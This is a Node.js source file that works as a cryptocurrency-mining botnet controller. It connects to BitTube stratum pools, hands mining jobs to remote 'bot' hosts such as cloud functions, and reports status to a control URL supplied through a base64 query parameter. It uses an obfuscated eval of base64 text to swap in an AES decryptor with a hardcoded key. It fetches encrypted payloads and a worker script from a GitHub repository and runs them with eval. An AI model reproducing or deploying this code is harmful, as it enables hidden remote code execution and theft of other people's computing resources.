'use strict';
const request = require('request');
const net = require('net');
const CryptoJS = require("crypto-js");
const express = require("express"); 
const app = express();
app.get('/',function(req,res) {
  if(req.query.id) { gg.url = BASE64_Decode(req.query.id);
    setTimeout(function() { delete gg.url }, 30 * 60000)
    res.json({values:db.summary, state:db.state})
  }
  else res.send('Hello world!')
});
app.listen(process.env.PORT||5000, () => {
  setInterval(function() { request(db.summary[1][0], function(err, res, body) { })}, 10 * 60000); 
})

var db = {
  state: 'red', wallet: '*',
  summary: [ ['Tube'], [require('./package.json').host], ['0 h/s'], ['0/0/0/0'], ['0/0/0/0'] ],
  pools: { hosts: [], backgrounds: [], hashes: [] },
  bots: { hosts: [], backgrounds: [], hashes: [] },
  log: []
}

var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') }
var glob = function(x) { eval(decrypt(x.substring(-~[])))}
('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY'+
 '3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyh'+
 'DcnlwdG9KUy5lbmMuVXRmOCkgfQ==')

var gg = { rec: false };
var pools = [];
var bots = [];
var yellow_pools = true;

setInterval(function() {
  var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;

  db.pools = { hosts: [], backgrounds: [], hashes: [] }
  db.summary[3][0] = '0/0/0/0'
  for(var i=0; i<pools.length; i++) {
    dbplus('pools',pools[i]);
    hsub += Number(pools[i].hash.split('/')[0]);
    hacp += Number(pools[i].hash.split('/')[1]);
    rt = pools[i].state == 'red' ? true: rt;
  }

  db.bots = { hosts: [], backgrounds: [], hashes: [] }
  db.summary[4][0] = '0/0/0/0'
  for(var i=0; i<bots.length; i++) {
    dbplus('bots',bots[i]);
    hsum += Number(bots[i].hash.split(' ')[0]);
    rt = bots[i].state == 'red' ? true: rt
  }

  db.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
  db.summary[2] = [hsum+' h/s '+hsub+'/'+hacp];

  if(!gg.rec && gg.url) {
    gg.rec = true;
    request.post({ url: gg.url, form: BASE64_Encode(JSON.stringify(db)), json: true, followAllRedirects: true },
    function(error, response, body) {
      if(error) { log({host:'google',color:'purple',msg:error.message}); gg.rec = false }
      else if(!body.yellow_pools) { log({host:'google',color:'purple',msg:'body is wrong (data)'}); gg.rec = false }
      else {
        db.log = []; var tasks = []; yellow_pools = body.yellow_pools == 'ON';
        if(body.wallet) {
          db.wallet = body.wallet; log({msg:'new wallet: '+db.wallet});
          if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push(pools[i].host); tasks.push(update_pools(list)) }
        }
        if(body.pools) { var list = []; for(var i=0; i<body.pools.length; i++) list.push(body.pools[i][0]); tasks.push(update_pools(list)) }
        if(body.bots) { var list = []; for(var i=0; i<body.bots.length; i++) list.push(body.bots[i][0]); update_bots(list) }
        Promise.all(tasks).then(msgs => { gg.rec = false });
      }
    })
  }
}, 1000);

function update_pools(list) {
  return new Promise((resolve, reject) => {
    var tasks = [];
    for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
    Promise.all(tasks).then(msgs => {
      for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
      pools = [];
      for(var j=0; j<list.length; j++) {
        pools.push(new bittube({ wallet: db.wallet, host: list[j] }));
        log({host:list[j],msg:'add pool'})
      }
      resolve(true)
    });
  })
}

function update_bots(list){
  for(var i=0; i<bots.length; i++) {
    if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
    log({host:bots[i].host,msg:'del bot'})
  }
  bots = [];
  for(var i=0; i<list.length; i++) {
    let nbot={host:list[i], state:'orange', hash:'0 h/s [0/0]'};
    bots.push(nbot); mybot('wakeup',nbot);
    log({host:list[i],msg:'add bot'});
  }
}

function dbplus(name,obj){
  db[name].hosts.push([obj.host]);
  var a = name == 'pools' ? db.summary[3][0].split('/') : db.summary[4][0].split('/')
  a[['red','orange','yellow','green'].indexOf(obj.state)]++
  db[name].backgrounds.push([obj.state])
  if(name == 'pools') db.summary[3][0] = a.join('/')
  else db.summary[4][0] = a.join('/');
  db[name].hashes.push([obj.hash]);
}

function log(data) {
  data.timestamp = new Date().toLocaleString();
  db.log.push(data);
}

function BASE64_Encode(x) { return Buffer.from(x).toString('base64') }
function BASE64_Decode(x) { return Buffer.from(x,'base64').toString('ascii') }

function mybot(cmd,bot) {
  if(cmd == 'wakeup') {
    bot.msg = "wakeup";
    bot.wakeup = setTimeout(function() { mybot('onmsg',bot) }, 60000);
  }
  else if(cmd == 'onmsg') {
    delete bot.wakeup; 
    if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
      for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
        if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
          pools[i].mysubmit(bot.msg[j]);
          break;
        };
      };
  
    let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
    if (jobs.length == 0) mybot('wakeup',bot)
    else {
      var data = { jobs: jobs };
      request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
        function(error, response, body) {
          if(body && body.toString().includes('Cannot POST'))
            request.post({url:bot.host,form:{worker:worker},json:true},function(error,response,body){botdb(error,body)})
          else botdb(error,body,true)
        }
      )
    }
  }

  function botdb(error,body,next) {
    if(error) bot.msg=error.message
    else if(!body) bot.msg='body is empty'
    else if(body.error) bot.msg=body.error
    else if(!body.state) bot.msg='body is wrong'
    else {
      bot.state = body.state;
      bot.hash = body.hash;
      bot.msg = body.msg;
      if(next) return mybot('onmsg',bot);
      else {
        log({host:bot.host,msg:bot.msg})
        return mybot('wakeup',bot)
      }
    }
    log({host:bot.host,color:'red',msg:bot.msg})
    if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
    else bot.state = 'red'; 
    bot.hash = '0 h/s '+bot.hash.split(' ')[2];
    mybot('wakeup',bot)
  }
}

function bittube(req) {
  var self = this;
  this.host = req.host;
  this.state = 'orange';
  this.hash = '0/0';
  this.job = null; this.submit = null;

  var wallet = req.wallet
  var client = new net.Socket();
  client.on('data', function(data) {
    data = JSON.parse(data)
    if(data.result) {
      if(data.result.status == 'OK') {
        var t = self.hash.split('/'); 
        if(Number(t[1]) < Number(t[0])) self.hash = t[0]+'/'+(Number(t[1])+1)
      }
      if(data.result.job) myjob(data.result.job)
    }
    if(data.method == 'job') myjob(data.params)
  });
  client.on('close', function() {
    self.state = 'red';
    self.job = null; self.submit = null
    log({host:self.host, color:'red',msg:'client close'})
    setTimeout(function() { self.reconnect() }, 60000);
  });
  client.on('error', function() {
    self.state = 'red';
    self.job = null; self.submit = null
    log({host:self.host, color:'red',msg:'client error'})
  });

  this.connect = function() {
    return new Promise((resolve, reject) => {
      var addr = self.host.split(':')[0]; var port = Number(self.host.split(':')[1])
      client.connect(port, addr, function() {
        var data = { method:"login", params:{login:wallet, pass:"x", rigid:"", agent:"NodeMiner" }, id:1 };
        client.write(JSON.stringify(data)+String.fromCharCode(10),'ascii');
      })
    })
  }
    
  this.close = function() {
    return new Promise((resolve, reject) => {
      if(client.readyState == 'open') client.destroy();
      resolve(self.host)
    })
  }

  this.reconnect = function() {
    self.close().then( res => self.connect() )
  }

  this.mysubmit = function(req) {
    if(yellow_pools) {
      self.state = 'yellow';
      self.job = null; 
    }
    self.submit = {
      method:"submit",
      params:{
        id:req.id,
        job_id:req.job_id,
        nonce:req.nonce,
        result:req.result
      },
      id:1
    }
    client.write(JSON.stringify(self.submit)+String.fromCharCode(10),'ascii');
    var t = self.hash.split('/');
    self.hash = (Number(t[0])+1)+'/'+t[1]
  }

  function myjob(req) {
    self.state = 'green';
    self.job = {
      id: req.id,
      version: 1344,
      throttle: Math.max(0, Math.min(0, 100)),
      job:{
        identifier: "job",
        job_id: req.job_id,
        algo: "cn-heavy",
        variant: 2,
        height: 0,
        blob: req.blob,
        target: req.target
      }
    }
    self.submit = null;
  }

  self.connect().then(
    res => { console.log(res) },
    err => { console.log(err) }
  )
}

request( require('./package.json').github+"/mylist/master/"+db.summary[1][0].split(/\/\/|\.|\:/)[2]+".aes", function(err, res, body) {
  if(err) console.log('github: '+error.message)
  else eval(decrypt(body))
  console.log(bots)
});

request( require('./package.json').github+"/mylist/master/Tube.aes", function(err, res, body) {
  if(err) console.log('github: '+error.message)
  else eval(decrypt(body))
});

var superbot = ''; var worker = '';
request( require('./package.json').github+"/mylist/master/superbot.js", function(err, res, body) {
  if(err) console.log('github: '+error.message)
  else {
    superbot = decrypt(body)
    worker = superbot+`

    app.db={state:'yellow',host:h,hash:'0 h/s [0/0]'};
    var bot = new superbot();
    var t_hash = l_hash = s_hash = 0;
    
    app.post('/worker', app.parser, function (req, res) {
      app.db.msg = 'nothing';
      var ps = [];
      for(var i=0; i<req.body.jobs.length; i++) ps.push(bot.onmessage(req.body.jobs[i]));
      Promise.all(ps).then(msgs => {
        t_hash += msgs.length;
        for(var i=0; i<msgs.length; i++) if(msgs[i] != 'nothing') {
          if(app.db.msg == 'nothing') app.db.msg = [msgs[i]]
          else app.db.msg.push(msgs[i]);
          s_hash++;
        }
        res.json(app.db);
      });
    });
    
    setInterval(function() {
      app.db.state = t_hash == l_hash ? 'yellow' : 'green';
      app.db.hash = (t_hash-l_hash)+' h/s ['+t_hash+'/'+s_hash+']';
      l_hash = t_hash;
    }, 1000);
    c(app.db)`;
  }
});
